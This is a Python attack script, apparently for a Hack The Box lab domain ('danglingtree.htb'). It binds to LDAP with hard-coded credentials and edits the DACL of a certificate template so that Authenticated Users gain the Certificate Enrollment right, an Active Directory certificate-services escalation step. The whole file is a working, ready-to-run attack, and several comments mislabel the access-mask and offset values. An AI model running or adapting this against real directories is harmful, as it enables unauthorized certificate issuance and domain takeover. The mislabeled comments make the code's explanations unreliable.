import ssl, struct, uuid
from ldap3 import Server, Connection, ALL, NTLM, Tls, MODIFY_REPLACE, BASE
from ldap3.protocol.microsoft import security_descriptor_control

# Setup SSL/TLS
tls = Tls(validate=ssl.CERT_NONE)

# LDAP connection parameters
server_ip = "10.129.31.40" # change here
port = 636
use_ssl = True
user_dn = "DANGLINGTREE\\jake.h"
password = "Passw0rd1!" # change here

# Distinguished Name for the target object (Certificate Template)
DN = "CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"

# Setup connection
server = Server(server_ip, port=port, use_ssl=use_ssl, tls=tls, get_info=ALL)
c = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)

# Security descriptor control to read/write DACL
ctrl = security_descriptor_control(sdflags=0x4)

# Search for the object to retrieve its security descriptor
c.search(DN, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=ctrl)

if not c.entries:
    print("[-] No entries found!")
    exit(1)

# Extract current security descriptor
sd = bytearray(c.entries[0]["nTSecurityDescriptor"].raw_values[0])

# Construct ACE (Access Control Entry)
# SID: S-1-5-5-X-Y format (Authentication authority) -> fixed AU
au = struct.pack("BB", 1, 1) + b"\x00\x00\x00\x00\x00\x05" + struct.pack("<I", 11)

# GUID for Certificate Enrollment (0E10C968-78FB-11D2-90D4-00C04F79DC55)
eg = uuid.UUID("0e10c968-78fb-11d2-90d4-00c04f79dc55").bytes_le

# Access mask: 0x100 (generic read) + 0x01 (generic write)
ab = struct.pack("<II", 0x100, 0x01) + eg + au

# ACE header: type=5 (ACCESS_ALLOWED_ACE), flags=0, length
ace = struct.pack("BBH", 5, 0, 4 + len(ab)) + ab

# Locate DACL header in the SD
do = struct.unpack_from("<I", sd, 16)[0]     # offset to owner
ds = struct.unpack_from("<H", sd, do + 2)[0] # offset to DACL
ac = struct.unpack_from("<H", sd, do + 4)[0] # ACE count
ip = do + ds                                  # start index of DACL entries

# Insert new ACE into the DACL
sd = sd[:ip] + bytearray(ace) + sd[ip:]

# Update ACE count and revision
struct.pack_into("<H", sd, do + 2, ds + len(ace))  # increase DACL size
struct.pack_into("<H", sd, do + 4, ac + 1)         # increment ACE count

# Update security descriptor
c.modify(DN, {"nTSecurityDescriptor": [(MODIFY_REPLACE, [bytes(sd)])]}, controls=ctrl)

# Check result
if c.result["result"] == 0:
    print("[+] Enrollment ACE added")
else:
    print("[-] " + str(c.result))

# Optional: disconnect
c.unbind()
